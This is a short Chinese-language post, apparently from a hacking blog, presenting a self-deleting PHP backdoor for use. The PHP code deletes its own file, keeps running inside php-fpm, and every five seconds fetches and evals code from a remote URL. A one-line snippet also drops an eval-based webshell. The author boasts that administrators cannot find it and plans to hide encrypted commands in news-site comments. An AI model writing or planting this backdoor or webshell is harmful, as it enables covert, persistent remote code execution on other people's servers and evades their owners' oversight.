### 在xxx.txt中写入你的后门代码，访问后就会删除自己并循环执行txt的代码例如txt里面写了一句这样的代码 file_put_contents('./1.php',"<?php @eval($_POST[cmd])'"?>");这样就会在目录下又生成一个木马如果对方写了是执行命令 。。。这段代码纯粹变成了一个等待命令的木马。。而且管理员检查木马文件的时候  都找不到。。。因为文件已经删除了木马却注入在php-fpm内sleep(5);  五秒就去远程读取一下指令。。。........打算将代码修改一下，加一些正则，去163某一篇新闻的评论里读取预先设定的恶意代码。。。hehe。。黑客连服务器都省了。黑客只需要去网易新闻评论窗口内写入自己的代码就行怕别人看懂？直接加密采用对称加密算法。。没有秘钥 谁也看不懂啥意思秘钥在这段后门里面写着
```PHP
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
$remote_file = 'http://xxx/xxx.txt';
while($code = file_get_contents($remote_file)){
@eval($code);
sleep(5);
};
```